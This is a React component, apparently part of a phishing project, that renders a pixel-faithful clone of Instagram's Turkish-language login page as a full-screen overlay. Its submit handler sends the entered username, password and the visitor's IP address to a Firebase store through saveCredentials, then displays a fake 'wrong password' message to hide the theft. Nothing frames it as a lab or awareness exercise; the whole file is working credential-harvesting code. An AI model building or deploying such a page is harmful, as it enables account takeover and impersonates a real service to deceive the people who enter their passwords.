import { useState } from 'react';
import { motion } from 'framer-motion';
import { saveCredentials } from '../lib/firebase';

export default function FakeInstagramLogin({ onSuccess, ip }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) return;

    setLoading(true);
    setError('');

    try {
      await saveCredentials({ username: username.trim(), password, ip });

      setTimeout(() => {
        setLoading(false);
        setError('Girdiğin şifre yanlış. Lütfen tekrar dene.');
        setTimeout(() => {
          onSuccess(username.trim());
        }, 1800);
      }, 2200);
    } catch (err) {
      console.error('Save error:', err);
      setLoading(false);
      onSuccess(username.trim());
    }
  };

  const isDisabled = !username.trim() || !password.trim();

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.15 }}
      className="ig-login-overlay"
    >
      <div className="ig-login-wrapper">
        <div className="ig-login-container">
          {/* Main Login Card */}
          <div className="ig-login-box">
            {/* Instagram Logo - SVG wordmark */}
            <div className="ig-logo-container">
              <svg aria-label="Instagram" className="ig-logo-svg" viewBox="0 0 174.6 51.0" width="175" height="51">
                <path d="M145.44 7.437c4.15 0 7.073 3.381 7.073 9.143v15.336h-4.33V17.218c0-3.788-1.554-5.884-4.42-5.884-2.91 0-4.96 2.32-4.96 5.884V31.96h-4.33V17.218c0-3.788-1.554-5.884-4.42-5.884-2.865 0-4.96 2.32-4.96 5.884V31.96h-4.33V7.843h4.33v3.067c1.42-2.186 3.516-3.473 6.336-3.473 2.866 0 5.19 1.377 6.426 3.877 1.6-2.5 3.966-3.877 6.605-3.877zm-76.27 12.423c0-5.076-3.201-8.415-7.348-8.415-4.15 0-7.345 3.339-7.345 8.415 0 5.076 3.205 8.418 7.345 8.418s7.348-3.342 7.348-8.418zm4.33 0c0 7.083-5.187 12.469-11.678 12.469-3.158 0-5.706-1.195-7.528-3.335v2.966h-4.33V.452h4.33v10.706c1.822-2.145 4.375-3.34 7.528-3.34 6.491.046 11.678 5.387 11.678 12.47v-.428zm-35.795 0c0-5.302-3.247-8.415-7.079-8.415-4.15 0-7.345 3.339-7.345 8.415 0 5.076 3.205 8.418 7.345 8.418 3.832 0 7.079-3.113 7.079-8.418zm4.33 11.65h-4.33v-2.964c-1.736 2.135-4.375 3.335-7.528 3.335-6.491 0-11.678-5.387-11.678-12.47S23.66 6.993 30.151 6.993c3.158 0 5.792 1.195 7.528 3.34V7.843h4.33V31.51zm-18.86-24.12c-2.504 0-4.42-.36-4.42-.36V3.143s1.78-.36 3.608-.36c4.058 0 6.515 2.005 6.515 5.661 0 3.115-2.322 5.122-5.658 5.122-.04-.09-.045-.166-.045-.166zm7.528 24.076V18.72s-1.6-.45-3.428-.45c-2.505 0-4.422 1.24-4.422 3.698v9.948H18.1V7.843h4.33v3.472c1.464-2.455 3.742-3.878 6.697-3.878 4.868 0 7.752 3.069 7.752 8.054v16.42h-4.33l-.047-.045zM10.23 7.437V31.96H5.9V7.798L.08 9.802V5.834l9.785-3.338.365.943v3.998zM164.13 26.163h-.946v-3.832h.946c.496 0 .946.36.946.99v1.873c0 .586-.449.969-.946.969zm-2.148 5.753h1.202v-4.798h.631l1.427 4.798h1.336l-1.516-4.798c.856-.316 1.472-1.035 1.472-2.024v-1.873c0-1.215-.856-2.025-2.148-2.025h-2.148v10.72h.765-.02zm.946-12.605c-3.607 0-6.56 2.924-6.56 6.574 0 3.608 2.953 6.575 6.56 6.575 3.608 0 6.56-2.924 6.56-6.574 0-3.608-2.908-6.575-6.56-6.575zm0 12.109c-3.068 0-5.57-2.52-5.57-5.534 0-3.069 2.502-5.535 5.57-5.535 3.068 0 5.57 2.52 5.57 5.535s-2.502 5.534-5.57 5.534zM90.885 7.843h4.24v3.787h-4.24V25.176c0 2.141 1.059 3.065 3.068 3.065h1.172v3.675l-1.783.09c-4.104 0-6.784-2.32-6.784-6.065V11.63h-3.563V7.843h3.563V2.76h4.33l-.003 5.083zm13.24 17.333c3.968 0 6.605-3.159 6.605-5.478h4.24c-.225 4.978-4.825 9.588-10.845 9.588-7.028 0-12.037-5.387-12.037-12.47S97.097 4.412 104.125 4.412c6.02 0 10.62 4.654 10.845 9.588h-4.24c0-2.316-2.637-5.478-6.605-5.478-4.465 0-7.707 3.339-7.707 8.415 0 5.076 3.242 8.418 7.707 8.418v-.179zm-46.95 6.785V.452h4.33v31.508h-4.33z" fill="#262626" />
              </svg>
            </div>

            <form onSubmit={handleSubmit} className="ig-form">
              {/* Floating label input - Username */}
              <div className="ig-input-container">
                <label className={`ig-floating-label ${username ? 'has-value' : ''}`}>
                  Telefon numarası, kullanıcı adı veya e-posta
                </label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className={`ig-input ${username ? 'has-value' : ''}`}
                  autoComplete="off"
                  autoCapitalize="off"
                  spellCheck="false"
                  aria-label="Telefon numarası, kullanıcı adı veya e-posta"
                  name="username"
                />
              </div>

              {/* Floating label input - Password */}
              <div className="ig-input-container">
                <label className={`ig-floating-label ${password ? 'has-value' : ''}`}>
                  Şifre
                </label>
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`ig-input ${password ? 'has-value' : ''}`}
                  autoComplete="off"
                  aria-label="Şifre"
                  name="password"
                />
                {password.length > 0 && (
                  <button
                    type="button"
                    className="ig-toggle-password"
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    {showPassword ? 'Gizle' : 'Göster'}
                  </button>
                )}
              </div>

              <button
                type="submit"
                className="ig-submit-btn"
                disabled={isDisabled || loading}
              >
                {loading ? (
                  <div className="ig-loader"></div>
                ) : (
                  'Giriş yap'
                )}
              </button>
            </form>

            {/* Divider */}
            <div className="ig-separator">
              <div className="ig-separator-line"></div>
              <span className="ig-separator-text">YA DA</span>
              <div className="ig-separator-line"></div>
            </div>

            {/* Facebook Login */}
            <button className="ig-fb-login" type="button">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185">
                <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" />
              </svg>
              <span>Facebook ile giriş yap</span>
            </button>

            {error && (
              <motion.div
                initial={{ opacity: 0, y: -4 }}
                animate={{ opacity: 1, y: 0 }}
                className="ig-error-msg"
              >
                <p>{error}</p>
              </motion.div>
            )}

            <a href="#" className="ig-forgot-link" onClick={(e) => e.preventDefault()}>
              Şifreni mi unuttun?
            </a>
          </div>

          {/* Signup Box */}
          <div className="ig-signup-box">
            <p>Hesabın yok mu? <a href="#" onClick={(e) => e.preventDefault()} className="ig-signup-cta">Kaydol</a></p>
          </div>

          {/* App Download */}
          <div className="ig-download-section">
            <p className="ig-download-text">Uygulamayı indir.</p>
            <div className="ig-badges">
              <a href="#" onClick={(e) => e.preventDefault()}>
                <img
                  src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
                  alt="App Store'dan indir"
                  className="ig-badge-img"
                />
              </a>
              <a href="#" onClick={(e) => e.preventDefault()}>
                <img
                  src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
                  alt="Google Play'den edinin"
                  className="ig-badge-img"
                />
              </a>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="ig-footer">
          <div className="ig-footer-links">
            <a href="#">Meta</a>
            <a href="#">Hakkında</a>
            <a href="#">Blog</a>
            <a href="#">İş İlanları</a>
            <a href="#">Yardım</a>
            <a href="#">API</a>
            <a href="#">Gizlilik</a>
            <a href="#">Koşullar</a>
            <a href="#">Konumlar</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Kişi yükleme ve davet etme</a>
            <a href="#">Meta Verified</a>
          </div>
          <div className="ig-footer-bottom">
            <select className="ig-lang-select" defaultValue="tr">
              <option value="tr">Türkçe</option>
              <option value="en">English</option>
              <option value="de">Deutsch</option>
              <option value="fr">Français</option>
              <option value="es">Español</option>
            </select>
            <span className="ig-copyright">© 2025 Instagram from Meta</span>
          </div>
        </div>
      </div>

      <style>{`
        .ig-login-overlay {
          position: fixed;
          inset: 0;
          background: #fafafa;
          z-index: 9999;
          display: flex;
          align-items: center;
          justify-content: center;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          overflow-y: auto;
        }

        .ig-login-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
          min-height: 100vh;
          justify-content: center;
          padding: 32px 0;
        }

        .ig-login-container {
          width: 350px;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        /* === MAIN BOX === */
        .ig-login-box {
          background: #fff;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 10px 40px;
          margin-bottom: 10px;
          width: 100%;
          box-sizing: border-box;
          text-align: center;
        }

        .ig-logo-container {
          margin: 36px auto 12px;
          display: flex;
          justify-content: center;
        }

        .ig-logo-svg {
          display: block;
        }

        /* === FORM === */
        .ig-form {
          margin-top: 24px;
          display: flex;
          flex-direction: column;
          gap: 6px;
        }

        .ig-input-container {
          position: relative;
          background: #fafafa;
          border: 1px solid #dbdbdb;
          border-radius: 3px;
          height: 36px;
          overflow: hidden;
        }

        .ig-input-container:focus-within {
          border-color: #a8a8a8;
        }

        .ig-floating-label {
          position: absolute;
          top: 50%;
          left: 8px;
          transform: translateY(-50%);
          font-size: 12px;
          color: #8e8e8e;
          pointer-events: none;
          transition: all 0.1s ease;
          transform-origin: left;
          line-height: 36px;
          top: 0;
          transform: none;
        }

        .ig-floating-label.has-value {
          font-size: 10px;
          line-height: 14px;
          top: 2px;
          transform: none;
        }

        .ig-input {
          width: 100%;
          height: 100%;
          padding: 14px 8px 2px;
          border: none;
          background: transparent;
          font-size: 12px;
          color: #262626;
          outline: none;
          box-sizing: border-box;
        }

        .ig-input:not(.has-value) {
          padding: 9px 8px 7px;
        }

        .ig-toggle-password {
          position: absolute;
          right: 8px;
          top: 50%;
          transform: translateY(-50%);
          background: none;
          border: none;
          font-size: 14px;
          font-weight: 600;
          color: #262626;
          cursor: pointer;
          padding: 0;
          line-height: 18px;
        }

        .ig-toggle-password:hover {
          color: #8e8e8e;
        }

        /* === SUBMIT === */
        .ig-submit-btn {
          margin-top: 8px;
          padding: 5px 9px;
          background: #0095f6;
          border: 1px solid transparent;
          border-radius: 8px;
          color: #fff;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          width: 100%;
          min-height: 32px;
          display: flex;
          align-items: center;
          justify-content: center;
          opacity: 1;
          transition: opacity 0.2s;
        }

        .ig-submit-btn:disabled {
          opacity: 0.3;
          cursor: default;
        }

        .ig-submit-btn:not(:disabled):hover {
          background: #1877f2;
        }

        .ig-submit-btn:not(:disabled):active {
          opacity: 0.7;
        }

        .ig-loader {
          width: 18px;
          height: 18px;
          border: 2px solid rgba(255,255,255,0.4);
          border-top-color: #fff;
          border-radius: 50%;
          animation: ig-spin 0.6s linear infinite;
        }

        @keyframes ig-spin {
          to { transform: rotate(360deg); }
        }

        /* === SEPARATOR === */
        .ig-separator {
          display: flex;
          align-items: center;
          margin: 18px 0 18px;
          gap: 18px;
        }

        .ig-separator-line {
          flex: 1;
          height: 1px;
          background: #dbdbdb;
        }

        .ig-separator-text {
          color: #8e8e8e;
          font-size: 13px;
          font-weight: 600;
          text-transform: uppercase;
        }

        /* === FB LOGIN === */
        .ig-fb-login {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          background: none;
          border: none;
          cursor: pointer;
          width: 100%;
          padding: 0;
          margin-bottom: 0;
        }

        .ig-fb-login span {
          color: #385185;
          font-size: 14px;
          font-weight: 600;
        }

        .ig-fb-login:hover span {
          color: #00376b;
        }

        /* === ERROR === */
        .ig-error-msg {
          margin-top: 16px;
        }

        .ig-error-msg p {
          color: #ed4956;
          font-size: 14px;
          line-height: 18px;
          margin: 0;
        }

        /* === FORGOT === */
        .ig-forgot-link {
          display: block;
          margin: 16px 0 14px;
          color: #00376b;
          font-size: 12px;
          text-decoration: none;
          line-height: 16px;
        }

        .ig-forgot-link:hover {
          text-decoration: underline;
        }

        /* === SIGNUP BOX === */
        .ig-signup-box {
          background: #fff;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 22px 0;
          margin-bottom: 10px;
          width: 100%;
          text-align: center;
          box-sizing: border-box;
        }

        .ig-signup-box p {
          margin: 0;
          font-size: 14px;
          color: #262626;
        }

        .ig-signup-cta {
          color: #0095f6;
          font-weight: 600;
          text-decoration: none;
        }

        .ig-signup-cta:hover {
          color: #00376b;
        }

        /* === DOWNLOAD === */
        .ig-download-section {
          text-align: center;
          margin: 10px 0 20px;
        }

        .ig-download-text {
          font-size: 14px;
          color: #262626;
          margin: 0 0 16px;
        }

        .ig-badges {
          display: flex;
          gap: 8px;
          justify-content: center;
        }

        .ig-badge-img {
          height: 40px;
          object-fit: contain;
        }

        /* === FOOTER === */
        .ig-footer {
          margin-top: 24px;
          width: 100%;
          max-width: 1066px;
          padding: 0 20px;
          box-sizing: border-box;
        }

        .ig-footer-links {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 0;
          margin-bottom: 16px;
        }

        .ig-footer-links a {
          color: #8e8e8e;
          font-size: 12px;
          text-decoration: none;
          margin: 0 8px 6px;
          line-height: 16px;
        }

        .ig-footer-links a:hover {
          text-decoration: underline;
        }

        .ig-footer-bottom {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 16px;
        }

        .ig-lang-select {
          background: transparent;
          border: none;
          color: #8e8e8e;
          font-size: 12px;
          cursor: pointer;
          outline: none;
          padding: 0;
        }

        .ig-copyright {
          color: #8e8e8e;
          font-size: 12px;
        }

        /* === MOBILE === */
        @media (max-width: 450px) {
          .ig-login-container {
            width: 100%;
            padding: 0 16px;
            box-sizing: border-box;
          }

          .ig-login-box,
          .ig-signup-box {
            border: none;
            background: transparent;
          }

          .ig-login-box {
            padding: 10px 0;
          }

          .ig-footer {
            padding: 0 16px;
          }
        }
      `}</style>
    </motion.div>
  );
}
